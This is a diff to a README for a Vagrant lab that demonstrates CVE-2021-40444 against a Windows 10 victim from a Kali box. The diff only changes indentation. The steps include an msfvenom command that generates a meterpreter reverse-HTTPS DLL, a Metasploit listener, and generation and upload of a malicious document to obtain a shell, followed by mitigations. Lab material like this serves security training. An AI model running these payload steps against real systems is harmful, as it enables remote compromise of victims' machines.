@@ -12,22 +12,21 @@ Import the boxes with the following commands through vagrant:
   4. vagrant init victim_package.box
   5. vagrant up
 
-Setup:
-  Win10:
-    1. In the win10 box, log in as administrator with the password vagrant.
-    2. Right click script.ps1 on the desktop and run with powershell. (Leave this open)
-    3. Run ipconfig.exe and obtain the address for this host.
+Setup (win10):
+  1. In the win10 box, log in as administrator with the password vagrant.
+  2. Right click script.ps1 on the desktop and run with powershell. (Leave this open)
+  3. Run ipconfig.exe and obtain the address for this host.
 
-  Kali:
-    1. cd Desktop/CVE-2021-40444.
-    2. generate your malicious dll with msfvenom. # msfvenom -p windows/x64/meterpreter/reverse_https LHOST=eth1 LPORT=443 -f dll -o test/shell.dll
-    3. start a listener in metasploit.
-    4. generate the malicious document. # python3 exploit.py generate test/calc.dll http://<kali IP>
-    5. visit http://<win 10 IP>/upload and upload the file.
-    6. listen for the shell.
+Setup (Kali):
+1. cd Desktop/CVE-2021-40444.
+2. generate your malicious dll with msfvenom. # msfvenom -p windows/x64/meterpreter/reverse_https LHOST=eth1 LPORT=443 -f dll -o test/shell.dll
+3. start a listener in metasploit.
+4. generate the malicious document. # python3 exploit.py generate test/calc.dll http://<kali IP>
+  5. visit http://<win 10 IP>/upload and upload the file.
+  6. listen for the shell.
   
-  Mitigations:
-    1. Install KB5005565 hotfix.
-    2. Edit windows registry with patch.reg in the repository.
+Mitigations:
+  1. Install KB5005565 hotfix.
+  2. Edit windows registry with patch.reg in the repository.
   
   
